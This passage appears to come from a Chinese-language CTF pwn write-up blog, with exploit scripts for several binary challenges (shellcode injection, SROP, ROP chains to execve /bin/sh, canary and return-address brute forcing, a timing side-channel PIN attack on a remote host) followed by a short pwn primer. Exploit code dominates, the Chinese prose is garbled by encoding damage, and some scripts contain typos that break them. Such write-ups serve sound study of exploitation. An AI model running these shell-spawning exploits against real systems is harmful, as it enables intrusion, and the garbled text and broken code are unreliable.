alt="image-20230530234339502"><br>expï¼š</p><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.os = &#39;linux&#39;context.log_level = &#39;debug&#39;p = process(&#39;./pwn&#39;)#p = remote(&#39;127.0.0.1&#39;, 1337)buf = b&#39;\x90&#39; * 108shellcode = asm(shellcraft.amd64.sh())payload = buf + b&#39;\x90&#39;*(104-len(shellcode)) +shellcodelog.success(&quot;shellcode_len : &quot; + hex(len(shellcode)))p.sendline(payload)p.interactive()    </code></pre><p>é€‰æ‹©ç”¨\x90ï¼ˆnopï¼‰è¿›è¡Œå¡«å……ä½¿å¾—æ”»å‡»ä»£ç æ›´å…·ç¨³å®šæ€§<br>104å‡å»shellcodeé•¿åº¦çš„bâ€™\x90â€™å­—èŠ‚ï¼Œè¿™ä¸ªéƒ¨åˆ†ä½œç”¨æ˜¯å°†shellcodeæŒªåˆ°æœ€åï¼ˆshellcodeå¯èƒ½åœ¨ä¸­é—´ç”Ÿæˆï¼‰ï¼Œå¦‚æœæ²¡æœ‰nopsledçš„å¡«å……ï¼Œåé¢çš„æ•°æ®ä¼šè¦†ç›–å‰é¢çš„shellcodeï¼Œä»è€Œå¯¼è‡´æ”»å‡»å¤±è´¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™éƒ¨åˆ†çš„å¡«å……æ˜¯ä¸ºäº†è®©Shellcodeä¸ä¼šè¢«åé¢çš„æ•°æ®è¦†ç›–ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531002410442.png" alt="image-20230531002410442"></p><p>ç»Ÿç»Ÿé€š</p><h3 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a><strong>ez_stack</strong></h3><p>(1)checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150721336.png" alt="image-20230531150721336"></p><p>å‘ç°NXæ‰“å¼€ å‡†å¤‡è¿›IDAæ‰¾æº¢å‡º</p><p>ï¼ˆ2ï¼‰è¿›IDA<br>  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150942976.png" alt="image-20230531150942976"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531151017632.png" alt="image-20230531151017632"></p><p>â€‹       å‘ç°æº¢å‡ºéƒ¨åˆ† æ— â€&#x2F;bin&#x2F;shâ€ éœ€è¦æˆ‘ä»¬æ„é€ ropé“¾è‡ªè¡Œå†™å…¥<br>â€‹       å¸¸è§„æ€è·¯å°±æ˜¯ç¬¬ä¸€æ¬¡ropå¾€<a href="https://so.csdn.net/so/search?q=bss&spm=1001.2101.3001.7020">bss</a>ä¸Šå†™&#x2F;bin&#x2F;shï¼Œç„¶åç¬¬äºŒæ¬¡è°ƒç”¨execve<br>â€‹       ä½†ç¨‹åºæœ¬èº«æ²¡æœ‰æœ¬åœ°ç›´æ¥è°ƒç”¨å‡½æ•°-&gt;é€šè¿‡syscallæ¥å¾—åˆ°shell<br>â€‹       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531170223533.png" alt="image-20230531170223533"></p><p> æŸ¥çœ‹å‘ç°ä¸ºSROP  åœ¨.dataæ®µæ‰¾åˆ°å¯å†™å…¥&#x2F;bin&#x2F;shçš„åœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531160459228.png" alt="image-20230531160459228"> </p><p>æ‰§è¡Œå®Œ read çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ­¤æ—¶ rax &#x3D;&#x3D; 0  åˆ©ç”¨SROP ã€åªç”¨äºå¯å†™æ–¹æ³•å†…ã€‘<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531171529997.png" alt="image-20230531171529997"></p><p>exp:</p><pre><code class="python">from pwn import *p = process(&#39;./stack&#39;)#p = remote(&#39;node2.yuzhian.com.cn&#39;,35543)context(os = &#39;linux&#39;,arch = &#39;amd64&#39;,log_level = &#39;debug&#39;)elf = ELF(&#39;./stack&#39;)libc = elf.libcdef debug():    gdb.attach(p)    pause()syscall = 0x4011eemov_rax_15 = 0x401146bin_sh = 0x404040#call execv(&quot;/bin/sh&quot;,0,0)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = bin_shsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rip = syscall#debug()payload = &#39;a&#39;*(0x10 + 0x8)payload += p64(0x4011C8)payload += p64(0)payload += p64(mov_rax_15)payload += p64(syscall)payload += str(sigframe)sleep(0.1)p.sendlineafter(&#39;F!\n&#39;,payload)#debug()sleep(0.1)p.sendline(&#39;/bin/sh\x00&#39;)sleep(0.1)p.sendline(&#39;\x00&#39;)p.interactive()</code></pre><p>SROPå°èµ å“ï¼ˆ<a href="https://www.cnblogs.com/bpcat/p/16879300.html">https://www.cnblogs.com/bpcat/p/16879300.html</a>)</p><h3 id="ã€2023CISCNã€‘"><a href="#ã€2023CISCNã€‘" class="headerlink" title="ã€2023CISCNã€‘"></a>ã€2023CISCNã€‘</h3><h4 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a><strong>shaokao</strong></h4><p>ï¼ˆ1ï¼‰è™šæ‹Ÿæœºchecksecä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/0.png" alt="0"></p><p>ï¼ˆ2ï¼‰è¿è¡Œä¸€ä¸‹ç¨‹åºç©ç©</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/1.png" alt="1"></p><p>å‘ç°æ²¡ç¢°åˆ°ç‰¹åˆ«ä¹‹å¤„<br>ï¼ˆ3ï¼‰è½¬æˆ˜IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/2.png" alt="2"></p><p>æŸ¥çœ‹mianå‡½æ•°å‘ç°éšè—ç›®å½•5 è·Ÿè¸ªçœ‹çœ‹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/3.png" alt="3"></p><p>å‘ç°strcpy çŒœæµ‹v1è¿›è¡Œäº†æº¢å‡º</p><p>å†å¾€ä¸‹ç¿»ç¿»<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/4.png" alt="4"></p><p>syscall  ä»¥åŠsys_exit æ˜æ˜¾çš„ç³»ç»Ÿè°ƒç”¨å·</p><p>åˆ°dataæ®µæŸ¥æ‰¾å¯å†™å…¥å£<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/5.png" alt="5"></p><p>æœç´¢sys å‘ç°-result çŒœæµ‹è´Ÿæ•°ï¼ˆ-10000ï¼‰æ‰“å¼€ç›®å½•5<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527200932728.png"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/8.png" alt="8">ï¼ˆ4ï¼‰åˆ©ç”¨ROPgadget æ„é€ æ‰€éœ€execveç³»ç»Ÿè°ƒç”¨exp<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/61.png" alt="61"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/6.png" alt="6"></p><p>ï¼ˆ5ï¼‰æ„é€ å¯¹åº”exp</p><pre><code class="python">from pwn import *from struct import packr=process(&#39;./shaokao&#39;)#r=remote(&#39;39.106.71.184&#39;,23931)r.sendlineafter(&quot;&gt;&quot;,b&quot;1&quot;)r.sendlineafter(&quot;&quot;,b&quot;1&quot;)r.sendlineafter(&quot;ï¼Ÿ\n&quot;,b&quot;-10000&quot;)r.sendlineafter(&quot;&gt;&quot;,b&quot;4&quot;)r.sendlineafter(&quot;&gt;&quot;,b&quot;5&quot;)p = b&#39;a&#39;*(0x28)p += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .datap += pack(&#39;&lt;Q&#39;, 0x0000000000458827) # pop rax ; retp += b&#39;/bin//sh&#39;p += pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p += pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; retp += pack(&#39;&lt;Q&#39;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack(&#39;&lt;Q&#39;, 0x000000000040264f) # pop rdi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e0) # @ .datap += pack(&#39;&lt;Q&#39;, 0x000000000040a67e) # pop rsi ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p += pack(&#39;&lt;Q&#39;, 0x00000000004a404b) # pop rdx ; pop rbx ; retp += pack(&#39;&lt;Q&#39;, 0x00000000004e60e8) # @ .data + 8p += pack(&#39;&lt;Q&#39;, 0x4141414141414141) # paddingp += pack(&#39;&lt;Q&#39;, 0x0000000000447339) # xor rax, rax ; retp += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret _1p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710)p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710)p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) p += pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; ret _59p += pack(&#39;&lt;Q&#39;, 0x0000000000402404) # syscallr.sendlineafter(&quot;çƒ§çƒ¤æ‘Šå„¿å·²å½’ä½ æ‰€æœ‰ï¼Œè¯·èµåï¼š&quot;,p)r.interactive(ï¼‰</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230527201915278.png" alt="image-20230527201915278"></p><p>ä¼˜åŒ–åçš„exp</p><pre><code class="python">from pwn import *from struct import packr=process(&#39;./shaokao&#39;)#r=remote(&#39;39.106.71.184&#39;,23931)r.sendlineafter(&quot;&gt;&quot;,b&quot;1&quot;)r.sendlineafter(&quot;&quot;,b&quot;1&quot;)r.sendlineafter(&quot;ï¼Ÿ\n&quot;,b&quot;-10000&quot;)r.sendlineafter(&quot;&gt;&quot;,b&quot;4&quot;)r.sendlineafter(&quot;&gt;&quot;,b&quot;5&quot;)padding = b&#39;a&#39; * 0x28pop_rsi_ret = pack(&#39;&lt;Q&#39;, 0x000000000040a67e) pop_rax_ret = pack(&#39;&lt;Q&#39;, 0x0000000000458827)mov_rax_ptr_rsi_ret = pack(&#39;&lt;Q&#39;, 0x000000000045af95)xor_rax_ret = pack(&#39;&lt;Q&#39;, 0x0000000000447339)pop_rdi_ret = pack(&#39;&lt;Q&#39;, 0x000000000040264f)pop_rdx_rbx_ret = pack(&#39;&lt;Q&#39;, 0x00000000004a404b)p = paddingp += pop_rsi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e0)   # @ .datap += pop_rax_ret + b&#39;/bin//sh&#39;p += mov_rax_ptr_rsi_retp += pop_rsi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e8)   # @ .data + 8p += xor_rax_retp += mov_rax_ptr_rsi_retp += pop_rdi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e0)   # @ .datap += pop_rsi_ret + pack(&#39;&lt;Q&#39;, 0x00000000004e60e8)   # @ .data + 8p += pop_rdx_rbx_ret + pack(&#39;&lt;Q&#39;, 0) + pack(&#39;&lt;Q&#39;, 0)p += xor_rax_retadd_rip_ret = pack(&#39;&lt;Q&#39;, 0x0000000000496710) # add rax, 1 ; retrop_len = 59rop_chain = [add_rip_ret] * rop_len#æ„å»ºä¸€ä¸ªrop_len å®Œæˆexecvep += b&#39;&#39;.join(rop_chain)#å°†åˆ—è¡¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²è¿›è¡Œå¡«å……p += pack(&#39;&lt;Q&#39;, 0x0000000000402404) # syscallr.sendlineafter(&quot;çƒ§çƒ¤æ‘Šå„¿å·²å½’ä½ æ‰€æœ‰ï¼Œè¯·èµåï¼š&quot;,p)r.interactive()</code></pre><h4 id="ã€funcannaryã€‘"><a href="#ã€funcannaryã€‘" class="headerlink" title="ã€funcannaryã€‘"></a><strong>ã€funcannaryã€‘</strong></h4><p>æ¶¨çŸ¥è¯†æ¶¨çŸ¥è¯† æ²¡å­¦å¤Ÿçš„èœç‹—ğŸ˜€<br>ï¼ˆ1ï¼‰å…ˆè¿è¡Œä¸€ä¸‹ peiâ€™dé…å¥—checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       æ ¹æ®é¢˜ç›®æç¤ºâ€™have funâ€™å’Œâ€™welcomeâ€™åœ¨çˆ†ç ´çš„expä¸­ä¼šç”¨ä½œäºè¦†ç›–èŠ‚ç‚¹</p><p>â€‹                              â€‹<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p><p>â€‹         å‘ç°Canaryå’ŒPIEéƒ½å¼€ å‡†å¤‡å¥½çˆ†ç ´ï¼ˆå¦‚æœæœ‰å¯ä»¥åˆ©ç”¨çš„å­—ç¬¦ä¸²canaryä¹Ÿå¯ä»¥ç»•è¿‡ï¼‰<br>â€‹         å¯¹åº”éšæœºåŒ– åç»­åœ¨IDAä¸­åªèƒ½åˆ©ç”¨å…¶åœ°å€è®¡ç®—åç§»</p><p>ï¼ˆ2ï¼‰è¿›IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p><p>forkæ¥å£ &#x3D;&#x3D; canaryçˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p><p>å‘ç°å‡½æ•°å…¥å£ä¸º0x122D å¹¶ä¸”å‘ç°â€&#x2F;bin&#x2F;cat flagâ€ æ¥ä¸‹æ¥æ‰¾æº¢å‡ºä½ç½®çˆ†ç ´cannary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p><p>æ˜æ˜¾æº¢å‡º å®šä½è¯¥å‡½æ•°sub_128Aï¼ˆçˆ†ç ´canaryçš„ä½ç½®ï¼‰çˆ†ç ´æˆåŠŸåçˆ†è¿”å›åœ°å€ ï¼ˆçˆ†canaryåœ°å€çš„ä¸‹ä¸€ä½ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p><p>å‡½æ•°å…¥å£ä¸º0x122D shellè¿”å›åœ°å€ä¸º1329 åç§»ä¸º0xfc è¦†ç›–çš„bufå¤§å°ä¸º0x62</p><p><strong>tips</strong><br>ã€1ã€‘canaryå¤§å°ä¸º0x00-0xff æ‰€ä»¥çˆ†ç ´æ—¶æ¯å­—èŠ‚éœ€å¾ªç¯257æ¬¡ åˆå› ä¸ºcanaryä½ä¸‰ä½å®šä¸º\x00ï¼ˆ32ä½çˆ†ç ´å¾ªç¯3æ¬¡ 64ä½å¾ªç¯7æ¬¡ï¼‰æ­¤å¤„éœ€å¾ªç¯7æ¬¡<br>ã€2ã€‘ç¨‹åºå…¥å£ç‚¹ä¸€èˆ¬éƒ½æ˜¯æ•´æ•°ï¼Œå³åœ°å€æœ€ä½ä½ä¸º00ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„åœ°å€ï¼Œ0x29æ˜¯å¯ä¿¡çš„ã€‚å°±åªè¦çˆ†ç ´åä¸€ä½å°±OKï¼Œå†åé¢çš„åœ°å€éƒ½ç›¸åŒï¼Œçˆ†ä¸çˆ†éƒ½ä¸€æ ·ã€‚</p><p>expï¼š</p><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.os = &#39;linux&#39;context.log_level = &#39;debug&#39;p = process(&quot;./fun&quot;)#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)p.recvuntil(b&#39;welcome\n&#39;) canary = b&#39;\x00&#39;#canaryfor k in range(7):  info(f&#39;No:&#123;K+1&#125;start,finding...&#39;)  for i in range(256):     p.send(b&#39;a&#39;*(0x70-8)+cannary+btyes([i]))     recv = p.recvuntil(b&#39;welcome\n&#39;)     if b&quot;have fun&quot; in recv:      cannary += bytes([i])      success(f&quot;canary =&gt; &#123;canary.hex()&#125;&quot;)      break      #return addressre_1 = 0x29re_2 = 0info(&#39;finding:re_2 ...&#39;)for re_i in range(0x100):  payload = b&#39;a&#39; * 0x68 + canary + b&#39;A&#39; * 8 + p8(re_1) + p8(re_i)#p8()å°†ç»™å®šçš„æ•´æ•°è½¬æ¢ä¸ºå•å­—èŠ‚çš„å­—èŠ‚ä¸²  p.send(payload)  recv = p.recvuntil(b&quot;welcome\n&quot;)  if b&quot;have fun&quot; in recv:       re_2 = re_i       success(f&quot;re_2 =&gt; &#123;hex(re_2)&#125;&quot;)       breakpayload = b&#39;a&#39; * (0x70-8) + canary + b&#39;A&#39; * 8 + p8(re_1 - 1) + p8(re_2 - 1)#-1å¯¹é½æ ˆp.send(payload)p.interactive()</code></pre><p>æœ¬åœ°get<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530213510778.png" alt="image-20230530213510778">  </p><p><strong>login</strong><br>æ— é™„ä»¶ åªæ‰“è¿œç¨‹ æ¶¨çŸ¥è¯†æ ä¾§ä¿¡é“æ”»å‡» </p><p>exp:</p><pre><code class="python">from pwn import *from sys import argvcontext(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)def s(a):    p.send(a)def sa(a, b):    p.sendafter(a, b)def sl(a):    p.sendline(a)def sla(a, b):    p.sendlineafter(a, b)def r():    p.recv()def pr():    print(p.recv())def ru(a):    return p.recvuntil(a)def inter():    p.interactive()def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))def get_sb():    return libc_base + libc.sym[&#39;system&#39;], libc_base + next(libc.search(b&#39;/bin/sh\x00&#39;))def getpin(pin):    subtime = -1    res =&#39;&#39;    for c in a:        pin_o = pin+c+&#39;0&#39;*(7-len(pin))        sum=0        for _ in range(10):            ru(&#39;&gt;&#39;)            sl(b&#39;3&#39;)            ru(b&quot;PIN code: &quot;)            start=time.time()            sl(pin_o)            rev=ru(b&#39;\n&#39;)            if b&quot;Wrong PIN code&quot; in rev:                pass            else:                print(pin_0)                break            end=time.time()            sum+=(end-start)        print(cur,sum)        avgtime=sum        if(avgtime&gt;subtime):            subtime=avgtime            res=c    return resa=&#39;0123456789&#39;p= remote(&quot;123.56.238.150&quot;,45118)pin=&#39;&#39;for i in range(8):    pin+=getpin(pin)    print(&quot;PIN:&quot;,pin)ru(b&#39;&gt;&#39;)sl(b&#39;2&#39;)ru(b&#39;PASSWD&#39;)sl(b&quot;123456&quot;)ru(b&#39;$&#39;)sl(b&quot;cat flag&quot;)p.interactive()#flag&#123;d39a1013-e066-4d64-8558-4a5855fb7303&#125;   pin code : 54730891            </code></pre><h3 id="ã€SSCTFã€‘"><a href="#ã€SSCTFã€‘" class="headerlink" title="ã€SSCTFã€‘"></a>ã€SSCTFã€‘</h3><p>pwn_stack<br>ï¼ˆ1ï¼‰checksec </p><p>â€‹      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604234931863.png" alt="image-20230604234931863"></p><p>â€‹       åªå¼€äº†NXå¥½åŠæğŸ˜€<br>ï¼ˆ2ï¼‰ è¿›IDA<br>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235352214.png" alt="image-20230604235352214"></p><p>å¾ˆæ˜æ˜¾çš„å‡½æ•°æç¤º å…ˆçœ‹çœ‹ä¸»å‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235530821.png" alt="image-20230604235530821"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235541815.png" alt="image-20230604235541815"></p><p>bufæº¢å‡ºä½†è¢«æ‰“å°å‡º å¯å¿½è§†ï¼ˆæ­¤å¤„çŸ¥è¯†ç‚¹è¾ƒä¸ºæ¨¡ç³Š è¿˜éœ€è¿›ä¸€æ­¥è¿›è¡Œç ”ç©¶è§£è¯»ï¼‰v1å¤„æº¢å‡º<br>æŸ¥çœ‹åç§»ä½0x98 å†å›åˆ°shellå‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230605000024030.png" alt="image-20230605000024030"></p><p>æ²¡ä»€ä¹ˆå¥½è¯´ç›´æ¥å¼€æ•´ å…¸å‹ret2text<br>expï¼š</p><pre><code class="python">from pwn import *p = process(&quot;./1&quot;)#å¤ªæ‡’äº†ç»™æ–‡ä»¶åæ”¹åäº†ğŸ˜œbin_sh = 0x0400831 sys_addr = 0x40083D#p.recvuntil(&quot;What&#39;s your name?&quot;)payload =b&#39;A&#39;* (0x90 + 8) + p64(bin_sh)  + p64(sys_addr)#p.recvuntil(&#39;\n&#39;)p.sendline(&#39;yub&#39;)p.recvuntil(&quot;How old are you?&quot;)p.sendline(payload)p.interactive()</code></pre><p>ä»å‡½æ•°å¤´è¿”å›æ³¨æ„æ ˆå¯¹é½é—®é¢˜ +1è·³è¿‡push rbpçš„8å­—èŠ‚å¯¹é½</p><h3 id="ã€Black-Ropã€‘"><a href="#ã€Black-Ropã€‘" class="headerlink" title="ã€Black Ropã€‘"></a>ã€Black Ropã€‘</h3><p>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171541372.png" alt="image-20230629171541372"></p><p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171837565.png" alt="image-20230629171837565"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171906502.png" alt="image-20230629171906502"></p><p>å¸¸è§„æº¢å‡ºæ~<br>ç³»ç»Ÿæ²¡ç»™å‡ºsystemå’Œâ€&#x2F;bin&#x2F;shâ€ æ‰€ä»¥æ„é€ rop</p><pre><code class="python">from pwn import *p = process(&#39;./rop&#39;) pop4 = 0x080493e8 # pop ebx ; pop esi ; pop edi ; pop ebp ; retpop1 = 0x0804901e # pop ebx ; retpop2 = 0x080493ea # pop edi ; pop ebp ; retpop3 = 0x080493e9 # pop esi ; pop edi ; pop ebp ; ret payload = b&#39;A&#39;*0x12+ flat(0,0x80492ce,0x8049293, pop1, 0x804a033, 0x80492e8, pop1, 0xbae, 0x804930b, pop2, 0x62023 , 0xBF1212, 0x80491c2)p.sendlineafter(b&quot;check your identity and read the flag.\n&quot;, payload)p.recvline()p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnæ¢ç´¢--å¤§æ‚çƒ©</title>
      <link href="/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>pwnçš„æ ¸å¿ƒï¼šäºŒè¿›åˆ¶æ¼æ´çš„åˆ©ç”¨å’ŒæŒ–æ˜<br>ç ”ç©¶å±‚æ¬¡ï¼šç¼–è¯‘æˆæœºå™¨ç çš„äºŒè¿›åˆ¶ç¨‹åºçš„æ¼æ´äºŒè¿›åˆ¶ç¨‹åºå®é™…ä¸ºå¯æ‰§è¡Œæ–‡ä»¶<br>linuxç³»ç»Ÿä¸‹ELF&#x3D;windowsç³»ç»Ÿä¸‹EXEæ–‡ä»¶<br><strong>ä¸€æ¬¡ç®€å•çš„hack</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307002535708.png" alt="image-20230307002535708"></p><p>CTFä¸­pwnæ”»å‡»è„šæœ¬æ€è·¯ï¼š</p><p>1.pwnç¨‹åº&#x2F;æœåŠ¡å™¨ï¼ˆå¿…ä¸å¯å°‘æ»´ï¼‰å¼€ç«¯â€”â€”&gt;from pwn import*<br>2.ä½¿ç”¨pythonä¸­pwn toolsç”¨remoteå‡½æ•°æ‰“å¼€è¿œç«¯éœ€è¦æ”»å‡»çš„æœåŠ¡å™¨ç«¯å£<br>3.è¿›è¡Œé“¾æ¥<br>4.æ„é€ æ¶æ„æ•°æ®<br>5.å‘é€æ¶æ„æ•°æ®<br>6.ä½¿ç”¨äº¤äº’å‡½æ•°ï¼ˆio.interactiveï¼ˆï¼‰ï¼‰è·å–flag</p><h5 id="ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥"><a href="#ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥" class="headerlink" title="ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥"></a><strong>ç¨‹åºçš„ç¼–è¯‘ä¸é“¾æ¥</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206225702913.png" alt="image-20230206225702913"></p><p>linuxå€ŸåŠ©æ–‡ä»¶å¤´è¿›è¡Œè¯†åˆ«!ï¼ˆç”¨vimæ‰“å¼€å¯æŸ¥çœ‹æºç â€“&gt;%!xxdå¯æŸ¥çœ‹åå…­è¿›åˆ¶è¡¨ç¤ºï¼‰<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206230237084.png" alt="image-20230206230237084"></p><h5 id="ç¼–è¯‘è¿‡ç¨‹"><a href="#ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="ç¼–è¯‘è¿‡ç¨‹"></a><strong>ç¼–è¯‘è¿‡ç¨‹</strong></h5><p>lsæŒ‡list fileå³åˆ—å‡ºæ–‡ä»¶ï¼›å¯ç”¨llæŸ¥çœ‹æ–‡ä»¶è¯¦ç»†å†…å®¹ã€‚<br>gccå…¼å…·ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨çš„åŠŸèƒ½ã€‚<br>ctrl+alt+t å¯åŠ¨shell</p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206231832031.png" alt="image-20230206231832031" style="zoom:150%;" 